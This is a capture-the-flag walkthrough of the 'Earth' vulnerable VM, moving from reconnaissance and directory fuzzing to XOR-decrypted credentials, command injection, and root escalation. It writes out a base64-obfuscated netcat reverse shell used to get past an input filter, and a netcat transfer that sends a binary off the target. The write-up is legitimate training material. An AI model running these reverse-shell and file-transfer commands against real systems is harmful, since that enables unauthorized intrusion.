<img width="535" height="115" alt="image" src="https://github.com/user-attachments/assets/61b292e9-ae3d-4548-b4cc-dfee4a830fc8" /># Sumamry
- Reconnaissance
- Exploitation
- Escalation

# Reconnaissance
After configuring the VM into my virtual box, it is time to identify the ip address of the target.
So I use this command:
```
sudo netdiscover -i eth0
```
to identify the targeted ip and end up with this
<img width="625" height="151" alt="Screenshot 2025-09-17 190126" src="https://github.com/user-attachments/assets/5fbefa44-3a3c-4386-bae9-bf5d03ac6ec8" />

This one looks suspicious to me so I would probably try to scan this using `nmap`
<img width="642" height="834" alt="Screenshot 2025-09-17 190432" src="https://github.com/user-attachments/assets/1774a63b-cad3-4089-8fbf-7ca5d18f5db1" />
<img width="655" height="26" alt="Screenshot 2025-09-17 190621" src="https://github.com/user-attachments/assets/0faea6fb-6845-4645-b41c-3f65b0f5dd13" />
```
nmap -T4 -O -A -vv -sV 192.168.0.212
```
I couldn't access normally to the targeted via port 80. But in the second photo, there are some domain names which I reckon those belonged to the target. Then I use this command:
```
sudo nano /etc/hosts
```
to add these domains into my machine, then making it easier for me to access.
<img width="1911" height="831" alt="Screenshot 2025-09-17 231820" src="https://github.com/user-attachments/assets/68558d8d-7b3d-475b-b711-2a77944625e3" />
The next step is fuzzing the hidden directory to find hidden folders. In this section, I use `gobuster` to fuzz this target
<img width="677" height="369" alt="Screenshot 2025-09-17 192217" src="https://github.com/user-attachments/assets/53aa2e4e-63fc-41b7-8d0d-d23889a3b111" />

So I try the endpoint `/admin` which directs me to another page and leads to the login portal.
<img width="1902" height="263" alt="Screenshot 2025-09-17 192141" src="https://github.com/user-attachments/assets/2ec87b48-f37f-481f-b111-a1678a114479" />
<img width="1720" height="322" alt="Screenshot 2025-09-17 192154" src="https://github.com/user-attachments/assets/ddcbf4e8-ce12-4adb-9f20-3427fe04b62a" />
I reckon that at this stage I am supposed to find the credentials by brute-forcing methods using `john-the-ripper` but I manually check and can not find the username let alone brute-force it. I remember that I only fuzz the domain `earth.local` only which means that I also need to fuzz the other as well
```
gobuster dir -w /usr/share/wordlists/big.txt -u http://terratest.earth.local
```
This command confuses me a lot because it would give me the exact same thing as the `earth.local` one. In that case, I get the reason why I can not get into this domain is because this domain should be https instead http in order to access
<img width="1723" height="137" alt="Screenshot 2025-09-17 233758" src="https://github.com/user-attachments/assets/8c0f62dd-e4de-4aa5-a3a5-873d740818fd" />
Improving the fuzzing command
```
gobuster dir -w /usr/share/wordlists/big.txt -u https://terratest.earth.local --no-tls-validation
```
Because the url contains the https which means it has the tls certificate and normally gobuster cannot handle that so I add that tag indicating that skip the tls verification process.

<img width="457" height="111" alt="Screenshot 2025-09-17 234615" src="https://github.com/user-attachments/assets/cef112b0-1065-4b2a-a034-3ef572a82416" />
Let's check the robots.txt file to see what I have there
<img width="1068" height="568" alt="Screenshot 2025-09-17 234706" src="https://github.com/user-attachments/assets/d160a349-7e5f-405f-8656-dea35fc4b9e7" />
There would be a file called testingnotes something which is emphasized Disallow, so I guess I would gather more information if I have a look at that file. 

<img width="1231" height="247" alt="Screenshot 2025-09-17 235254" src="https://github.com/user-attachments/assets/2e607fc5-63a7-4a34-851c-b14c1c9468ee" />

In this file, there are 3 important things:
- it uses XOR encryption as the algorithm
- testdata.txt
- terra is the username of the admin login portal
So I already have the username which means that I am going to brute-force it real quickly to get deeper. But it would take a lot of time, then I choose to decrypt XOR encrypted message using cyberchef.
I need a key for XOR decryption which has been mentioned earlier, it lies in the testdata.txt.
<img width="1905" height="135" alt="Screenshot 2025-09-18 000255" src="https://github.com/user-attachments/assets/2314a36a-5973-4eeb-9583-19d7eee70f54" />

Try with the first message, the second and the third respectively
<img width="1530" height="582" alt="Screenshot 2025-09-18 000344" src="https://github.com/user-attachments/assets/b88a1358-9c3f-468f-ba05-a6f98773d997" />
<img width="1540" height="569" alt="Screenshot 2025-09-18 000703" src="https://github.com/user-attachments/assets/df17b4f9-8481-4720-a8a6-b6d04947fc56" />
<img width="1540" height="595" alt="Screenshot 2025-09-18 000739" src="https://github.com/user-attachments/assets/e8e63af8-f160-4248-8590-5033484e272d" />

# Exploitation
The phrase "earthclimatechangebad4humans" is repeated again and again so I deduct that it would be the password for user terra?
Succefully login
<img width="1556" height="419" alt="Screenshot 2025-09-18 001356" src="https://github.com/user-attachments/assets/ade7051f-e403-4520-b979-444d91c6c20f" />
In order to find the flag specifically for user, I use this command:
```
cat /var/earth_web/user_flag.txt
```
<img width="1133" height="422" alt="Screenshot 2025-09-18 001327" src="https://github.com/user-attachments/assets/86e84f43-07b1-4ebd-bc72-43322a9a252e" />
Now it's time to get escalate. I would use netcat to connect this 
<img width="1912" height="369" alt="Screenshot 2025-09-18 002001" src="https://github.com/user-attachments/assets/5a7c7c66-3e2a-4f23-9b30-725d54787beb" />
Unfortunately, they forbide me against doing such thing. However, nothing can stop me. I will encode base 64 for this command then inject that into the input field again.

```
echo "nc -e /bin/bash {ip} 1234" | base64
```

TIP: using this command :
```
ifconfig | grep eth0
```

and afterward, I would receive an encoded string and this is the format that I am going to put in the input field

```
{encoded_stirng} | base64 -d | bash
```

But I also need to set up a listener as well

```
nc -lnvp 1234
```

Done and now just run the command and I will receive the connection. The thing is I made a mistake at the initiating the connection in the input field which should look like this.
```
echo {encoded_stirng} | base64 -d | bash
```

Boom!!! Got access to the target

# Escalation 

First I have to set up a backdoor for reconnecting in case I accidentally disconnect it
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Now even if I use Ctrl+Z I still can reinitialize using the following command
<img width="516" height="203" alt="Ảnh chụp màn hình 2025-09-18 200033" src="https://github.com/user-attachments/assets/a5279180-b63f-416f-931d-32e220b9c9d6" />

```
stty raw -echo;fg;reset
```
<img width="423" height="114" alt="Screenshot 2025-09-18 200422" src="https://github.com/user-attachments/assets/2babfc2b-7a99-49e6-89cd-50e1e567a8ad" />
Let's find the most vulnerable file which requires finding the binaries with SUID bit:

```
find / -perm -u=s -type f 2>/dev/null
```
<img width="387" height="323" alt="Screenshot 2025-09-18 200653" src="https://github.com/user-attachments/assets/a6a73d45-7fa3-441b-a1d3-fca3de7c5533" />
I notice the `/usr/bin/reset_root` stands out, I have never met one before so I would try my best to exploit this. 

<img width="359" height="48" alt="Screenshot 2025-09-18 200911" src="https://github.com/user-attachments/assets/0a153106-6baa-435d-b5f9-98040567347e" />
But first, I need to bring this file to my host machine to further examine.
On our host
```
nc -lp 9999 > reset_root
```
On the remote server
```
nc -w 3 {ip} 9999 < /usr/bin/reset_root
```
Now there is a tool to find out what is going on with this file called `ltrace`
For someone who do not have `ltrace` and do not know what it is. `ltrace` is a tool for debugging 'tldr' in short. So using this tool to find out what is going on with the binary file.
Granting execution permission for this file
```
chmod +x reset_root
```
<img width="637" height="205" alt="Screenshot 2025-09-18 202831" src="https://github.com/user-attachments/assets/42e27660-b30e-4a55-8b3e-644ceedb1848" />
I know the reason why this file failed to run because I reckon that on that server which does not include these 3 file caused the file to fail.
Therefore, I only need to create those file and attempt to run the binary file again.
```
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcMOWewe
reset_root
```
<img width="535" height="115" alt="Screenshot 2025-09-18 203129" src="https://github.com/user-attachments/assets/903f60f7-130e-40bd-8bf5-9af54687e4e2" />
After executing, I get the password for root which is `Earth`. Then, escalating my permission into root using the following command:
```
su - 
```
Then the server gonna ask us about the password then just input the above password and I get access under `root` user successfully.
<img width="545" height="64" alt="Screenshot 2025-09-18 203738" src="https://github.com/user-attachments/assets/cf36f83d-df3e-4967-8449-0be224f8d660" />
<img width="591" height="497" alt="Screenshot 2025-09-18 203820" src="https://github.com/user-attachments/assets/a67f8c44-1372-4b8e-9909-c0c2431dc6f8" />

I finished the room and got both of the flags
Happy hacking!!!
